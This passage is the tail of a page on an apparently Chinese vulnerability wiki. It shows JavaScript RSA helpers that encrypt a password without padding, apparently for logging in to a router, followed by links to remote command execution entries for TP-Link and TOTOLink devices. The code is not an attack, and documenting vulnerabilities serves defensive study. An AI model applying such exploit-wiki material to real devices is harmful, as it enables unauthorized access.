<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nx">x</span><span class="p">.</span><span class="nx">modPowInt</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">e</span><span class="p">,</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">n</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// Return the PKCS#1 RSA encryption of &quot;text&quot; as an even-length hex string</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">RSAEncrypt</span><span class="p">(</span><span class="nx">text</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">m</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">nopadding</span><span class="p">(</span><span class="nx">text</span><span class="p">,(</span><span class="k">this</span><span class="p">.</span><span class="nx">n</span><span class="p">.</span><span class="nx">bitLength</span><span class="p">()</span><span class="o">+</span><span class="mf">7</span><span class="p">)</span><span class="o">&gt;&gt;</span><span class="mf">3</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="nx">m</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">doPublic</span><span class="p">(</span><span class="nx">m</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="nx">c</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">h</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">c</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mf">16</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="p">((</span><span class="nx">h</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mf">1</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="nx">h</span><span class="p">;</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="s2">&quot;0&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">h</span><span class="p">;</span>
<span class="p">}</span>


<span class="kd">function</span><span class="w"> </span><span class="nx">MainEncrypt</span><span class="p">(</span><span class="nx">n</span><span class="p">,</span><span class="nx">e</span><span class="p">,</span><span class="nx">message</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">RSAKey</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">doPublic</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">RSADoPublic</span><span class="p">;</span>
<span class="w">    </span><span class="nx">RSAKey</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">setPublic</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">RSASetPublic</span><span class="p">;</span>
<span class="w">    </span><span class="nx">RSAKey</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">encrypt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">RSAEncrypt</span><span class="p">;</span>

<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">rsa</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">RSAKey</span><span class="p">();</span>

<span class="w">    </span><span class="nx">rsa</span><span class="p">.</span><span class="nx">setPublic</span><span class="p">(</span><span class="nx">n</span><span class="p">,</span><span class="nx">e</span><span class="p">);</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">passwd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">rsa</span><span class="p">.</span><span class="nx">encrypt</span><span class="p">(</span><span class="nx">message</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">passwd</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>
<h2 id="_5">四、参考链接<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
<blockquote>
<p><a href="https://www.03sec.com/3207.shtml">https://www.03sec.com/3207.shtml</a></p>
</blockquote>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../%EF%BC%88CVE-2020-9374%EF%BC%89TP-Link%20TL-WR849N%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../%EF%BC%88CVE-2020-9374%EF%BC%89TP-Link%20TL-WR849N%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2020-9374）TP-Link TL-WR849N 远程命令执行漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../TOTOLink/TOTOLink%20%E5%A4%9A%E4%B8%AA%E8%AE%BE%E5%A4%87%20download.cgi%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2022-25084/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../TOTOLink/TOTOLink%20%E5%A4%9A%E4%B8%AA%E8%AE%BE%E5%A4%87%20download.cgi%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2022-25084/" class="btn btn-xs btn-link">
        TOTOLink 多个设备 download.cgi 远程命令执行漏洞 CVE-2022-25084
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>